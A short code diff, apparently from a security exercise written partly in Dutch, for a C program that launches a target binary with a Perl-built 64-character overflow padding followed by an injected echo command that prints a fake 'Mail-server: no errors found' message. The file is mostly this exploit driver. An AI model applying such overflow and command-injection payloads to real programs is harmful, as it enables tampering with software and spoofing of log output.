@@ -62,12 +62,7 @@ echo "Mail-server: no errors found"
 // ./a.out "$(perl -e 'print "A"x64 . "echo \"\nEPIC TEST\n\"\"')"    
 
 int main(int argc, char *argv[]){
-	if(argc != 1){
-		printf("\nGebruik: %s \n", argv[0]);
-		exit(0);
-	}
-
-	char command[] = "./log-analyzer \"$(perl -e 'print \"\x41\"x64 . \"echo \\\"\\n";
+	char command[] = "./oef4 \"$(perl -e 'print \"A\"x64 . \"echo \\\"\\n";
 	strcat(command, "Mail-server: no errors found");
 	strcat(command, "\\n\\\"\"')\"");
 
